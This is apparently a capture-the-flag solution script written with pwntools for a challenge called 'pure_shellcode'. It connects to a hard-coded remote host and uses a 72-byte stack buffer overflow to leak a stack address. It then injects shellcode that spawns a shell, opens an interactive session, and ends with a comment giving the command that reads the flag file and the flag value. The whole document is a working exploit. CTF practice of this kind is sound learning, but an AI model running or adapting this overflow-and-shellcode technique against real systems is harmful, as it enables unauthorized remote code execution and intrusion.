from pwn import *

context.terminal = ['tmux', 'split', '-h']
#p = process('./pure_shellcode')
#gdb.attach(p)
p = remote('141.85.224.106', 31340)
payload = "a"*72+p64(0x4000D4)
p.send(payload)
p.recvuntil(payload)
stack = u64(p.recv(8))
log.info("stack {}".format(hex(stack)))

context.arch='amd64'
shellcode = asm(shellcraft.sh())
p.send("a"*72+p64(stack)+shellcode)

p.interactive()

# cat /home/ctf/flag
# CNS_CTF{c57d8b44974ea272c516614b5c168e7d}
